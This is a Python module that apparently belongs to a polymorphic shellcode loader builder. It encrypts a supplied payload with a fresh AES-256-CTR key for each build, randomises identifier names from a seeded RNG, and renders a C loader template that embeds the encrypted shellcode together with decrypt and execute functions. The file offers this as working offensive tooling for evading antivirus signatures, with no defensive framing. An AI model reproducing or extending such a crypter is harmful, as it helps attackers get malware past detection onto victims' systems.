"""Compose the C source for the loader from the recipe.

Stage 1: a single C template parameterized by Jinja2. Encrypts the payload
in-place, picks identifier names from a seeded RNG, embeds the resulting bytes
as a C array.
"""
from __future__ import annotations

import base64
from pathlib import Path

from jinja2 import Environment, FileSystemLoader, StrictUndefined

from recipe import Recipe
from orchestrator.polymorphic import (
    gen_aes256_key, gen_aes_iv, gen_idents, make_rng,
)

SUBMODULES_DIR = Path(__file__).resolve().parent.parent / "submodules"
TEMPLATES_DIR = SUBMODULES_DIR / "core"


def _bytes_to_c_array(data: bytes) -> str:
    chunks = []
    for i in range(0, len(data), 16):
        row = ", ".join(f"0x{b:02x}" for b in data[i:i+16])
        chunks.append("  " + row)
    return ",\n".join(chunks)


def _aes256_ctr_encrypt(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """Manual AES-256-CTR with cryptography library."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    enc = cipher.encryptor()
    return enc.update(plaintext) + enc.finalize()


def compose(recipe: Recipe) -> tuple[str, dict]:
    """Returns (rendered_c_source, metadata_dict_for_build).

    metadata_dict includes the picked compiler flags, output filename hints,
    polymorphism metrics for caller logging.
    """
    rng = make_rng(recipe.seed)

    # Identifiers (polymorphism)
    idents = gen_idents(rng, count=10)
    shellcode_var, size_var, key_var, iv_var = idents[:4]
    decrypt_fn, exec_fn = idents[4:6]

    # AES key + IV: generated fresh per-build (stored in recipe so callers see them)
    if not recipe.encryption.key_b64:
        recipe.encryption.key_b64 = base64.b64encode(gen_aes256_key()).decode("ascii")
    if not recipe.encryption.iv_b64:
        recipe.encryption.iv_b64 = base64.b64encode(gen_aes_iv()).decode("ascii")

    key = base64.b64decode(recipe.encryption.key_b64)
    iv = base64.b64decode(recipe.encryption.iv_b64)
    plaintext = base64.b64decode(recipe.payload.bytes_b64)
    ciphertext = _aes256_ctr_encrypt(plaintext, key, iv)

    env = Environment(
        loader=FileSystemLoader(str(TEMPLATES_DIR)),
        undefined=StrictUndefined,
        keep_trailing_newline=True,
    )
    template = env.get_template("loader_main.c.j2")

    ctx = {
        "shellcode_var": shellcode_var,
        "size_var": size_var,
        "key_var": key_var,
        "iv_var": iv_var,
        "decrypt_fn": decrypt_fn,
        "exec_fn": exec_fn,
        "shellcode_bytes": _bytes_to_c_array(ciphertext),
        "shellcode_len": len(ciphertext),
        "key_bytes": _bytes_to_c_array(key),
        "iv_bytes": _bytes_to_c_array(iv),
        "recipe_seed": recipe.seed,
        "payload_sha": recipe.payload.sha256[:16],
    }
    source = template.render(**ctx)
    metadata = {
        "shellcode_var": shellcode_var,
        "seed": recipe.seed,
        "ciphertext_len": len(ciphertext),
    }
    return source, metadata
